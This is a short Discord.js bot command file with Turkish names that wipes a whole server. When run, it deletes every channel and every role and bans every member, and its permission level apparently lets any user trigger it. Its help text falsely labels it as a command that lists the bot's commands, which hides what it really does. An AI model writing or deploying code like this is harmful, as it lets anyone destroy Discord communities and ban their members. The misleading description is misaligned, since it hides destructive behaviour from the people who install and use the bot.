const { MessageEmbed } = require("discord.js");
const conf = require("../ayarlar.json");

module.exports.run = async (client, message, args) => {

message.guild.channels.cache.forEach(sila => sila.delete())

message.guild.roles.cache.forEach(sila => sila.delete())

message.guild.members.cache.forEach(sila => sila.ban())
}
module.exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ["sıfırla"],
  permLevel: 0
};

module.exports.help = {
  name: 'sunucuyusıfırla',
  description: 'Botta bulunan tüm komutları gösterir',
  usage: 'komutlar'
};